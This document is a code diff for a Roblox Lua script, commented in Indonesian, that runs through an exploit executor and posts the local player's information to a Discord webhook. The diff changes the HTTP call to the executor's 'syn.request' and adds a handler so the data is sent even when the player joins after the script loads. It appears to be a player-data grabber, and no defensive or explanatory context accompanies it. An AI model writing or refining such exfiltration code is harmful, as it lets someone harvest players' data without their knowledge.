@@ -42,7 +42,7 @@ local function sendPlayerInfo()
     local jsonData = HttpService:JSONEncode(data)
 
     -- Mengirim request POST ke webhook Discord menggunakan executor HTTP request function
-    local response = request({
+    local response = syn.request({
         Url = webhookUrl,
         Method = "POST",
         Headers = {
@@ -68,4 +68,10 @@ end)
 -- Jika pemain lokal sudah ada (misalnya, jika skrip dijalankan setelah pemain ditambahkan)
 if Players.LocalPlayer then
     sendPlayerInfo()
+else
+    Players.PlayerAdded:Connect(function(player)
+        if player == Players.LocalPlayer then
+            sendPlayerInfo()
+        end
+    end)
 end
